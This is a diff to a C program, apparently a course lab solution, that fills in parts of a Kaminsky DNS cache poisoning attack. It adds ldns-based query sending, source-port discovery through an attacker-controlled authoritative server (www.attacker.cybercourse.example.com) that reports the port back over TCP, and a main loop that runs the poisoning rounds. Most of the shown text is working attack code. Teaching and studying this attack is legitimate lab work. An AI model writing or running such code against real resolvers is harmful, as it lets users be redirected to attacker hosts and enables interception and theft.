@@ -335,30 +335,134 @@ static void build_unique_subdomain(int round, char *buf, size_t buf_len)
     (void)buf_len;
 }
 
-/* Send a single DNS query (UDP) to the resolver for the given name. */
+/**
+ * send_dns_query_to_resolver - Send DNS query to recursive resolver
+ * @qname: Fully qualified domain name to query
+ * 
+ * Sends a UDP DNS query to the resolver which will trigger it to query
+ * upstream authoritative servers.
+ * 
+ * Returns: 0 on success, -1 on failure
+ */
 static int send_dns_query_to_resolver(const char *qname)
 {
-    /* TODO:
-     * 1. Create UDP socket.
-     * 2. Build DNS query using ldns (ldns_resolver or manual ldns_pkt).
-     * 3. Serialize to wire and sendto() to RESOLVER_IP:53.
-     * 4. Close socket.
-     */
-    (void)qname;
-    return 0;
+    int sockfd;
+    struct sockaddr_in resolver_addr;
+    ldns_pkt *query = NULL;
+    uint8_t *wire_data = NULL;
+    size_t wire_len = 0;
+    ldns_status status;
+    int ret = -1;
+    
+    // Create UDP socket
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd < 0) {
+        perror("socket (UDP)");
+        return -1;
+    }
+    
+    // Build DNS query
+    query = ldns_pkt_query_new(
+        ldns_dname_new_frm_str(qname),
+        LDNS_RR_TYPE_A,
+        LDNS_RR_CLASS_IN,
+        LDNS_RD  // Recursion desired
+    );
+    
+    if (!query) {
+        fprintf(stderr, "Failed to create DNS query for %s\n", qname);
+        close(sockfd);
+        return -1;
+    }
+    
+    // Serialize to wire format
+    status = ldns_pkt2wire(&wire_data, query, &wire_len);
+    if (status != LDNS_STATUS_OK) {
+        fprintf(stderr, "Failed to serialize query: %s\n",
+                ldns_get_errorstr_by_id(status));
+        ldns_pkt_free(query);
+        close(sockfd);
+        return -1;
+    }
+    
+    // Setup resolver address
+    memset(&resolver_addr, 0, sizeof(resolver_addr));
+    resolver_addr.sin_family = AF_INET;
+    resolver_addr.sin_port = htons(DNS_PORT);
+    if (inet_pton(AF_INET, RESOLVER_IP, &resolver_addr.sin_addr) != 1) {
+        perror("inet_pton");
+        goto cleanup;
+    }
+    
+    // Send query to resolver
+    ssize_t sent = sendto(sockfd, wire_data, wire_len, 0,
+                          (struct sockaddr *)&resolver_addr,
+                          sizeof(resolver_addr));
+    
+    if (sent < 0) {
+        perror("sendto (resolver)");
+        goto cleanup;
+    }
+    
+    printf("Sent DNS query for %s to resolver %s\n", qname, RESOLVER_IP);
+    ret = 0;
+    
+cleanup:
+    if (wire_data) free(wire_data);
+    if (query) ldns_pkt_free(query);
+    close(sockfd);
+    return ret;
 }
 
-/* Learn resolver's source port by sending a query to www.attacker.cybercourse.example.com
- * and capturing the outgoing request from the resolver with pcap.
+/**
+ * learn_resolver_source_port - Discover the source port used by resolver
+ * 
+ * Sends a DNS query to the resolver for www.attacker.cybercourse.example.com.
+ * The resolver will forward the query to our attacker's authoritative server,
+ * which captures the source port and sends it back to us over TCP.
+ * 
+ * This is critical for the Kaminsky attack as we need to spoof responses
+ * with the correct destination port.
+ * 
+ * Returns: 0 on success, -1 on failure
  */
 static int learn_resolver_source_port(void)
 {
-    /* TODO:
-     * 1. Use pcap filter to capture UDP packets to ROOT_NS_IP:53.
-     * 2. Send query via resolver to www.attacker.cybercourse.example.com.
-     * 3. When you see the outgoing packet from resolver -> root, save its source port
-     *    into g_resolver_src_port.
-     */
+    const char *trigger_domain = "www.attacker.cybercourse.example.com";
+    int listen_sock;
+    int port;
+    
+    printf("\n=== Learning Resolver Source Port ===\n");
+    
+    // Setup TCP listener to receive port from our auth server
+    listen_sock = setup_tcp_listener();
+    if (listen_sock < 0) {
+        fprintf(stderr, "Failed to setup TCP listener\n");
+        return -1;
+    }
+    
+    // Send DNS query to resolver for our attacker domain
+    printf("Sending trigger query to resolver...\n");
+    if (send_dns_query_to_resolver(trigger_domain) < 0) {
+        fprintf(stderr, "Failed to send DNS query\n");
+        close(listen_sock);
+        return -1;
+    }
+    
+    // Wait for our auth server to send us the port over TCP
+    printf("Waiting for auth server to report resolver source port...\n");
+    port = wait_for_resolver_port_over_tcp(listen_sock);
+    close(listen_sock);
+    
+    if (port < 0 || port > 65535) {
+        fprintf(stderr, "Invalid port received: %d\n", port);
+        return -1;
+    }
+    
+    g_resolver_src_port = (uint16_t)port;
+    printf("\n✓ Resolver source port learned: %u\n", g_resolver_src_port);
+    printf("=====================================\n\n");
+    
     return 0;
 }
 
@@ -502,37 +606,36 @@ int main(void)
     /* Seed RNG - random subdomains or txid sequences. */
     (void)srand((unsigned int)time(NULL));
 
-    // 1. start TCP listener to receive the resolver port from the server
-    int listen_sock = setup_tcp_listener();
-    if (listen_sock<0){
-      return EXIT_FAILURE;
-    }
+    printf("=== Kaminsky DNS Cache Poisoning Attack ===\n\n");
 
-    printf("Step 2: Initialize raw socket for packet injection\n");
-
+    printf("Step 1: Initialize raw socket for packet injection\n");
     if (init_raw_socket() != 0) {
-        goto cleanup;
+        return EXIT_FAILURE;
     }
 
-    printf("Step 3: Learning resolver source port...\n");
+    printf("Step 2: Learning resolver source port...\n");
     if (learn_resolver_source_port() != 0) {
         goto cleanup;
     }
 
-    printf("Step 4: Starting Kaminsky attack rounds...\n");
+    printf("Step 3: Starting Kaminsky attack rounds...\n");
     /* Main Kaminsky-style loop: multiple attack windows with different subdomains. */
     for (int round = 0; round < MAX_ROUNDS; ++round) {
         perform_attack_round(round);
 
         if (check_poisoning() != 0) {
             /* success */
+            printf("\n✓ Attack successful! DNS cache poisoned.\n");
             ret = 0;
             break;
         }
     }
+    
+    if (ret != 0) {
+        printf("\n✗ Attack failed after %d rounds.\n", MAX_ROUNDS);
+    }
 
 cleanup:
     cleanup_raw_socket();
-    close(listen_sock);
     return ret;
 }
